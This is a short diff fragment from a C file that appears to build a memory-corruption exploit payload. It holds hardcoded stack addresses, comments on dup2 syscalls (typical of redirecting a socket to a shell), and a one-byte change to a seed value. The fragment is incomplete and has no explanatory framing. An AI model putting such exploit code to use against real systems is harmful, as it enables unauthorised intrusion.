@@ -68,7 +68,7 @@ int main(void)
   char con_arg_16_addr[] = "\x9c\x68\xbf\xbf"; // bufr + 383
 
   // dup2 syscalls 0xbfbf671d
-  char dup_arg_seed[] = "\x62\x01\x01\x01";
+  char dup_arg_seed[] = "\x5A\x01\x01\x01";
   // #1 
   char dup_call_3_addr[] = "\x10\x69\xbf\xbf"; // bufr + 499, 
   char dup_call_arg_addr[] = "\x14\x69\xbf\xbf"; // bufr + 503, 
